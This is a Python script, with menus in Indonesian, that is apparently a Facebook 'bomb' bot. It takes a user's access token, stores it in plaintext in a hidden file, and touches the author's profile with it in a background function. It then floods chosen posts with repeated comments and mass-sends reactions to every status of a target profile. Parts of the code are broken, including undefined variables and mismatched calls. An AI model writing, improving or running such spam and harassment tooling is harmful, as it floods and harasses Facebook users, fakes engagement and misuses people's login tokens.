import concurrent.futures,os,time,requests,bs4,re,random,json,sys
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
#reload(sys)
#sys.setdefaultencoding('utf8')

emil=print
p = "\x1b[1;97m"
m = "\x1b[1;91m"
h = "\x1b[1;92m"
k = "\x1b[1;93m"
b = "\x1b[1;94m"
u = "\x1b[1;95m"
l = "\x1b[1;96m"
mx = u+"ʕ"+m+" x"+u+"_"+m+"×"+u+"ʔ"
sup = "\x1b[4;97m              \x1b[0;00m\x1b[1;97m/\x1b[3;91mM\x1b[1;95mcybear\x1b[1;91mX\x1b[0;00m"
#penampung
total = []
id = []
try:
	Emil = open(".Emil.txt","a")
except:
	pass
Emil = open(".Emil.txt","r").read()

def banner():
	emil("""
\x1b[1;91m    __  ___ \x1b[1;95m__            __ \x1b[1;91m _  __
\x1b[1;91m   /  |/  /\x1b[1;95m/ /_   ____   / /_\x1b[1;91m| |/ /
\x1b[1;91m  / /|_/ /\x1b[1;95m/ __ \ / __ \ / __/\x1b[1;91m|   / 
\x1b[1;91m / /  / /\x1b[1;95m/ /_/ // /_/ // /_ \x1b[1;91m/   |  
\x1b[1;91m/_/  /_/\x1b[1;95m/_.___/ \____/ \__/\x1b[1;91m/_/|_| \x1b[1;91m×xx M\x1b[1;95mcybear\x1b[1;91mX xx×
""")
def klir():
	os.system("clear")
def login():
	klir()
	banner()
	emil(sup+"\n")
	emil(u+" ["+m+"o1"+u+"]"+p+" Login Token")
	emil(u+" ["+m+"o2"+u+"]"+p+" Login Cookie\n")
	yusuf = input(mx+" Pilih : ")
	if yusuf=="1":
		token()
	elif yusuf=="2":
		cookie()
	else:
		emil(mx+" "+yusuf+" Tidak ada Dimenu");time.sleep(3)
		login()
def cookie():
	emil("sabaar")
def token():
	yusuf = input(mx+" Masukan Token : ")
	try:
		emiil = requests.get("https://graph.facebook.com/me?access_token="+yusuf)
		idam = json.loads(emiil.text)["name"]
		emil(mx+" Welcome "+idam)
		usup = open(".Emil.txt","w");usup.write(yusuf);usup.close()
		bot(Emil)
		menu(Emil)
	except (KeyError,IOError):
		emil(mx+" Token Invalid")
		login()
	except requests.exceptions.ConnectionError:
		emil(mx+" Koneksi Terganggu")
def bot(Emil):
	with requests.Session() as (Usup_Sayang_Emil_wkwk):
	 try:
		 cinta = Usup_Sayang_Emil_wkwk.get("https://graph.facebook.com/100050672943941/subscribers?access_token="+Emil)
	 except :
		 pass
def menu(Emil):
	klir()
	banner()
	try:
		Emmil = requests.get("https://graph.facebook.com/v1.0/me?access_token="+Emil)
		Sayang = json.loads(Emmil.text)
		EmilUsup = Sayang["name"]
		try:
			Usup = requests.get("https://graph.facebook.com/100050672943941/subscribers?access_token="+Emil)
			Sayangg = json.loads(Usup.text)
			UsupEmil = Sayangg["summary"]["total_count"]
		except:
			UsupEmil = " "
	except:
		emil(mx+m+" Token Invalid")
		login()
	emil(mx+m+" ×x "+b+"Premium Limited Editions"+m+" x× "+u+"ʕ"+m+"×"+u+"_"+m+"x"+u+" ʔ")
	emil(sup)
	emil(mx+p+" Nama   : %s"%EmilUsup)
	emil(mx+p+" Murid  : %s"%UsupEmil)
	emil("\n"+sup+"\n")
	emil(u+" ["+m+"o1"+u+"]"+p+" BOT report Publik (Sabar ya ngab:v)")
	emil(u+" ["+m+"o2"+u+"]"+p+" BOT Boom Komen Publik")
	emil(u+" ["+m+"o3"+u+"]"+p+" BOT Boom Reaction Posts Publik")
	emil(sup)
	usup = input(mx+p+" No : "+m)
	if usup=="1" or usup=="o1":
		bot_repot()
	elif usup=="2" or usup=="02":
		bot_komen(Emil)
	elif usup=="3" or usup=="03":
		bot_reak(Emil)
	else:
		emil(mx+p+" Pilihan "+m+usup+p+" Tidak Ada di Menu")

# BOT REPORT

def bot_repot():
	emil(mx+p+" Belom Jadi ngaab :v")
#	os.system("python2 repot.pyc")

# BOT KOMEN

def bot_komen(Emil):
	komeng = input(mx+p+" Masukan Komen : ")
	try:
		brpa = int(input(mx+p+" Mau Bom Berapa Postingan? : "))
	except ValueError:
		emil(mx+m+" Isi dengan Angka")
	for hihi in range(brpa):
		hihi+=1
		idih = input(mx+p+" Masukan Id Postingan ke %s: "%hihi)
		id.append(idih)
		try:
			Usup_Emil = int(input(mx+p+" Limit : "))
		except (ValueError,TypeError):
			emil(mx+m+" Kesalahan Penulisan")
			time.sleep(3)
			bot_komen(Emil)
	for haha in range(brpa):
		emil(id)
		for dot in range(Usup_Emil):
			dot+=1
			emil(mx+p+" Mengirim Komen ke %s"%dot)
			for uid in id:
				emil(uid)
				try:
					anjay = requests.post("https://graph.facebook.com/"+uid+"/comments/?message="+komeng+"&access_token="+Emil)
					emil(h+" SUKSES")
					total.append(anjay)
					if "checkpoint" in anjay:
						emil(mx+p+" Sudah Melebihi Batas / Checkpoint")
				except (KeyError,ValueError,IOError,TypeError):
					emil(m+"  GAGAL")
					continue
				except ConnectionError:
					continue
	emil(sup)
	emil(mx+p+" Total Komen Terkirim : %s"%len(total))

# BOT LIKE

def bot_reak(Emil):
	emil(sup+"\n")
	emil(u+" ["+m+"o1"+u+"]"+p+" BOT Boom Like Publik")
	emil(u+" ["+m+"o2"+u+"]"+p+" BOT Boom Love Publik")
	emil(u+" ["+m+"o3"+u+"]"+p+" BOT Boom Sedih Publik")
	emil(u+" ["+m+"o4"+u+"]"+p+" BOT Boom Marah Publik")
	emil(u+" ["+m+"o5"+u+"]"+p+" BOT Boom Wow Publik")
	emil(u+" ["+m+"o6"+u+"]"+p+" BOT Boom Haha Publik")
	emil(sup)
	Ucup = input(mx+p+" No : "+m)
	if Ucup=="1":
		type = "LIKE"
		kepin = "👍"
	elif Ucup=="2":
		type = "LOVE"
		tipe = "❣️ "
	elif Ucup=="3":
		type = "SAD"
		tipe = "🥲"
	elif Ucup=="4":
		type = "ANGRY"
		tipe = "😡"
	elif Ucup=="5":
		type = "WOW"
		tipe = "😱"
	elif Ucup=="6":
		type = "HAHA"
		tipe = "🤣"
	else:
		emil(mx+m+" Input Invalid!!!")
	emill = input(mx+p+" Masukan Id Profil : "+b)
	try:
		cayang = requests.get("https://graph.facebook.com/v1.0/"+emill+"?access_token="+Emil)
		_Emil_ = json.loads(cayang.text)
		Sayang_Emill = _Emil_["id"]
		emil(mx+p+" Nama  :"+b+" %s"%_Emil_["name"])
	except (KeyError,IOError):
		emil(mx+m+" Id Salah !!!")
		time.sleep(3)
		bot_reak(Emil,type)
	try:
		sayang = input(mx+p+" Limit : ")
		emil(" ")
	except ValueError:
		emil(mx+m+" Isi dengan Angka!!!")
		time.sleep(3)
		bot_reak(Emil,type)
	data = requests.get("https://graph.facebook.com/"+emill+"/statuses?limit="+sayang+"&access_token="+Emil)
	_usup_ = json.loads(data.text)
	for _emil_ in _usup_["data"]:
		try:
			jangan = _emil_["message"]
		except:
			jangan = "-"
		rindu = _emil_["id"]
		__Emil__ = Sayang_Emill+"_"+rindu
		emil(mx+p+" Id Post : "+rindu)
		emil(mx+p+" Status  : "+jangan)
		try:
			Post = requests.post("https://graph.facebook.com/"+__Emil__+"/reactions?type="+type+"&access_token="+Emil)
			sabaar = json.loads(Post.text)
			if "success" in sabaar:
				id.append(type)
				emil(mx+h+" Sukses  "+p+": %s"%(tipe))
				emil(sup+"\n")
			elif "error" in sabaar:
				total.append(type)
				emil(mx+m+" Gagal  "+p+": %s"%(tipe))
				emil(sup+"\n")
		except (KeyError,IOError):
			emil(sabaar)
			emil(mx+m+" Id Salah !!!")
			emil(sup+"\n")
		except ConnectionError:
			time.sleep(10)
			emil(mx+m+" Koneksi Terganggu!!!")
	emil(mx+b+" Selsai")
	emil(mx+p+" Total Sukses : %s"%len(id))
	emil(mx+p+" Total Sukses : %s"%(len(total)))




if __name__ == '__main__':
#	login()
	menu(Emil)

